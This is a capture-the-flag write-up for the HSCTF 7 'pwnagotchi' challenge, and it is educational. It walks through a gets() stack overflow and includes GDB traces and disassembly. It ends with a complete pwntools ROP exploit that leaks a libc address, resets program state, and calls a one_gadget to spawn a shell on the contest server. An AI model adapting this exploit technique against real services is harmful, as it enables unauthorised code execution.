---
title: "HSCTF 7: pwnagotchi (Pwn)"
layout: post
date: 2020-06-06
tags:
- CTF
- writeup
- HSCTF 7
- Pwn
comments: true
---

> Have fun with your new pwnagotchi!
>
> Connect to view your \ (•-•) / at `nc pwn.hsctf.com 5005`
>
> Author: meow
>
> [pwnagotchi](/files/pwnagotchi)

As with most pwn challenges, let's start off by checking what kind of binary we're given.

```
vagrant@ctf:/vagrant/challenges/hsctf/pwnagotchi$ file pwnagotchi
pwnagotchi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f8c34ef43ba5a8fbce8b89987797d88f7adbb31f, not stripped
```

Okay, it's just a 64 bit ELF binary. Let's run it to get a better idea of what it does.

```
vagrant@ctf:/vagrant/challenges/hsctf/pwnagotchi$ ./pwnagotchi
Enter your pwnagotchi's name:
AAAAA

\ (•-•) /

AAAAA is not happy!

```

Once we run the binary, it asks us for our name and repeats to back to us. Let's disassemble the binary to get a better idea of what goes on.

```nasm
lea     rdi, aEnterYourPwnag ; "Enter your pwnagotchi's name: "
call    _puts
lea     rax, [rbp+input]
mov     rdi, rax
mov     eax, 0
call    _gets
```

Oh wow, seems like `_gets` is being used to get our input. That's a red flag for a buffer overflow. Let's test our hypothesis by trying it out in GDB. But first, let's check the security features of this binary.

```
pwndbg> checksec
[*] '/vagrant/challenges/hsctf/pwnagotchi/pwnagotchi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Ok, there's no canary so that makes things even easier.

```
pwndbg> r <<< $(python -c 'print "A"*128')
Starting program: /vagrant/challenges/hsctf/pwnagotchi/pwnagotchi <<< $(python -c 'print "A"*128')
Enter your pwnagotchi's name:

\ (•-•) /

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not happy!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400988 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd18c0 (_IO_stdfile_1_lock) ◂— 0x0
 RDI  0x1
 RSI  0x7fffffffb5c0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not happy!\n'
 R8   0x8f
 R9   0x80
 R10  0xffffff80
 R11  0x246
 R12  0x400700 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdd50 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7fffffffdc78 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 RIP  0x400988 (main+322) ◂— ret
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x400988 <main+322>    ret    <0x4141414141414141>
─────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdc78 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓
─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0           400988 main+322
   f 1 4141414141414141
   f 2 4141414141414141
   f 3 4141414141414141
   f 4 4141414141414141
   f 5 4141414141414141
   f 6 4141414141414141
   f 7 4141414141414141
   f 8 4141414141414141
   f 9 4141414141414141
   f 10 4141414141414141
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Awesome, looks like we can overwrite RIP. Now we just need to call [one_gadget](https://github.com/david942j/one_gadget) to get a shell. However, there are a couple of issues we've got to deal with first. Firstly we don't even know what version of libc is running on the server, and without that we wouldn't be able to calculate address of `one_gadget`. Fortunately, there's a simple solution to this: leak a few libc addresses and try to guess the version of libc based on their relative offsets from each other. The [libc database search](https://libc.blukat.me/) tool helps us achieve this easily. So let's write a script to do just that.

```
#! /usr/bin/python2

from pwn import *

HOST = 'pwn.hsctf.com'
PORT = 5005
BINARY = './pwnagotchi'

elf = context.binary = ELF(BINARY)

# RIP Padding

p = process(BINARY)
p.sendline(cyclic(64, n = 8))
p.wait()

core = p.corefile

p.close()
os.remove(core.file.name)

PAYLOAD_PADDING = cyclic_find(core.read(core.rsp, 8), n = 8)

log.success('Found padding length: {}'.format(PAYLOAD_PADDING))

# Start connection

r = remote(HOST, PORT)

# Stage 1: Build ROP Chain
# - Leak puts@libc
# - Call eat()
# - Call zzz()
# - Call main()

rop = ROP(elf)
rop.puts(elf.got.puts)

log.success('Built ROP Chain')
log.success(rop.dump())

# Stage 2: Leak puts@libc

r.recvuntil('Enter your pwnagotchi\'s name: \n')

r.sendline(fit({PAYLOAD_PADDING: rop.chain()}))
r.recvuntil('is not happy!\n')

libc_puts = u64(r.recvn(6) + '\x00\x00')
log.info('Leaked libc_puts: 0x{:x}'.format(libc_puts))
```

Let's start off by leaking the address of `puts`.

```
vagrant@ctf:/vagrant/challenges/hsctf/pwnagotchi$ python xpl.py
[*] '/vagrant/challenges/hsctf/pwnagotchi/pwnagotchi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './pwnagotchi': pid 32049
[*] Process './pwnagotchi' stopped with exit code -11 (SIGSEGV) (pid 32049)
[+] Parsing corefile...: Done
[*] '/vagrant/challenges/hsctf/pwnagotchi/core.32049'
    Arch:      amd64-64-little
    RIP:       0x400988
    RSP:       0x7fffffffda98
    Exe:       '/vagrant/challenges/hsctf/pwnagotchi/pwnagotchi' (0x400000)
    Fault:     0x6161616461616161
[+] Found padding length: 20
[+] Opening connection to pwn.hsctf.com on port 5005: Done
[*] Loaded cached gadgets for './pwnagotchi'
[*] Leaked libc_puts: 0x7fee5a7169c0
```

Nice, so the libc address of `puts` is `0x7fee5a7169c0`. Let's try entering that into the libc database search.

![](/images/pwnagotchi/pwnagotchi-1.png)

Seems like it's either going to be `libc6_2.27-3ubuntu1_amd64` or `libc6_2.3.6-0ubuntu20_i386_2`. Since this is a 64 bit binary to begin with, we can conclude that the libc version is probably going to be `libc6_2.27-3ubuntu1_amd64`. Now that we can calculate the libc base address ergo calculate the address of `one_gadget` I suppose we're golden right? Not quite. Let's look at the following excerpt of disassembly that's called before the program gets our input.

```nasm
    movzx   eax, cs:once
    test    al, al
    jz      short loc_4008F8
    movzx   eax, cs:sleepy
    test    al, al
    jnz     short loc_4008D6
    movzx   eax, cs:hungry
    test    al, al
    jz      short loc_4008F8

loc_4008D6: ; "if (once && (sleepy || hungry))"
    lea     rdi, asc_400A2A ; "\n\\ ("
    call    _puts
    lea     rdi, aThisIsWeird ; "This is weird...\n"
    call    _puts
    mov     eax, 0
    jmp     locret_400987; Jump to end of main

loc_4008F8: ; else
    mov     cs:once, 1
    lea     rdi, aEnterYourPwnag ; "Enter your pwnagotchi's name: "

; /////////////////// Truncated ////////////////////////

locret_400987:
    leave
    retn
    main    endp
```

In order for us to be able to send our `one_gadget` payload, we have to pass the condition `if (once && (sleepy || hungry))`. Let's inspect their values, at the end of the first iteration of main. Keep in mind that either `once` must be set to `1`, or both `sleep` and `hungry` must be set to `0`.

```
pwndbg> r
Starting program: /vagrant/challenges/hsctf/pwnagotchi/pwnagotchi
Enter your pwnagotchi's name:
asdf

\ (•-•) /

asdf is not happy!

Breakpoint 1, 0x0000000000400982 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────
 ► 0x400982       <main+316>                 mov    eax, 0
   0x400987       <main+321>                 leave
   0x400988       <main+322>                 ret
────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdc60 ◂— 0x66647361ffffdd50
01:0008│      0x7fffffffdc68 ◂— 0x3e800000000
02:0010│ rbp  0x7fffffffdc70 —▸ 0x400990 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffdc78 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
04:0020│      0x7fffffffdc80 ◂— 0x1
05:0028│      0x7fffffffdc88 —▸ 0x7fffffffdd58 —▸ 0x7fffffffe09c ◂— '/vagrant/challenges/hsctf/pwnagotchi/pwnagotchi'
06:0030│      0x7fffffffdc90 ◂— 0x100008000
07:0038│      0x7fffffffdc98 —▸ 0x400846 (main) ◂— push   rbp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> print (char) once
$1 = 0 '\000'
pwndbg> print (char) sleepy
$2 = 1 '\001'
pwndbg> print (char) hungry
$3 = 1 '\001'
```

Ahh crap, that's the complete opposite of what we want. Is there any way to fix this?

```nasm
public eat
eat proc near

push    rbp
mov     rbp, rsp
lea     rdi, s          ; "om nom nom"
call    _puts
mov     cs:hungry, 0
nop
pop     rbp
retn

eat endp

public zzz
zzz proc near

push    rbp
mov     rbp, rsp
lea     rdi, aZzz       ; "zzz..."
call    _puts
call    _rand
mov     ecx, eax
mov     edx, 55555556h
mov     eax, ecx
imul    edx
mov     eax, ecx
sar     eax, 1Fh
sub     edx, eax
mov     eax, edx
add     eax, eax
add     eax, edx
sub     ecx, eax
mov     edx, ecx
lea     eax, [rdx+1]
mov     edi, eax        ; seconds
call    _sleep
mov     cs:sleepy, 0
nop
pop     rbp
retn

zzz endp
```

Lucky for us, the binary provides us with two helper functions `eat` and `zzz`, which sets both `hungry` and `sleepy` to `0`.

Okay so let's summarize our plan of attack:

1. First ROP Chain
  - Leak the address of puts@libc (call `puts(puts)`)
  - Calculate libc base address, then `one_gadget` address
  - Call `eat()`
  - Call `zzz()`
  - Call `main()`

2. Second ROP Chain
  - Call `one_gadget`
3. Profit

Now let's write our exploit.

```python
#! /usr/bin/python2

from pwn import *

HOST = 'pwn.hsctf.com'
PORT = 5005
BINARY = './pwnagotchi'

elf = context.binary = ELF(BINARY)
libc = ELF('libc.so.6')

libc.symbols['one_gadget'] = 0x4f322

# RIP Padding

p = process(BINARY)
p.sendline(cyclic(64, n = 8))
p.wait()

core = p.corefile

p.close()
os.remove(core.file.name)

PAYLOAD_PADDING = cyclic_find(core.read(core.rsp, 8), n = 8)

log.success('Found padding length: {}'.format(PAYLOAD_PADDING))

# Start connection

r = remote(HOST, PORT)

# Stage 1: Build ROP Chain
# - Leak puts@libc
# - Call eat()
# - Call zzz()
# - Call main()

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.eat()
rop.zzz()
rop.main()

log.success('Built ROP Chain (Leak, eat, zzz, main)')
log.success(rop.dump())

# Stage 2: Leak puts@libc

r.recvuntil('Enter your pwnagotchi\'s name: \n')

r.sendline(fit({PAYLOAD_PADDING: rop.chain()}))
r.recvuntil('is not happy!\n')

libc_puts = u64(r.recvn(6) + '\x00\x00')
log.info('Leaked libc_puts: 0x{:x}'.format(libc_puts))

# Stage 3: Build ROP Chain (Call one_gadget)

libc.address = libc_puts - libc.symbols['puts']
log.info('Calculated libc base address : 0x{:x}'.format(libc.address))

rop1 = ROP([elf, libc])
rop1.one_gadget()

log.success('Built ROP Chain (Call one_gadget)')
log.success(rop1.dump())

# Stage 4: Pwn

r.recvuntil('Enter your pwnagotchi\'s name: \n')

r.sendline(fit({PAYLOAD_PADDING: rop1.chain()}))

r.interactive()

```

Let's see it in action!

<script id="asciicast-337085" src="https://asciinema.org/a/337085.js" async></script>

Flag: `flag{theyre_so_cute}`
